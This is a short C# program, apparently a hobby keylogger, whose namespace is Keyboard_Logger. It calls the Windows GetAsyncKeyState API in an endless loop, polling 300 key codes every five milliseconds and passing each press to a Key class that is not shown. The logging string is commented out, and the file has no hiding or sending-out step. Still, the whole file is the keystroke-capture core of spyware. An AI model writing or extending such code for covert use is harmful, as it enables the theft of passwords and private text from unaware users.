using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using static Keyboard_Logger.Key;

namespace Keyboard_Logger{
    class Program{
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        //static string keylog = "";

        static List<Key> keys = new List<Key>();
        static void Main(string[] args){

            for (int i = 0; i < 300; i++){
                keys.Add(new Key(i));
            }
            
            while(true){
                
                Thread.Sleep(5);

                //check all key states

                for(int i = 0; i < 300; i++){
                    Key key = keys[i];
                    int keyState = GetAsyncKeyState(i);
                    if(keyState == 32769){
                        key.pressed();
                    }
                    if(keyState == 0){
                        key.notPressed();
                    }
                    
                }
            }

        }
    }
}
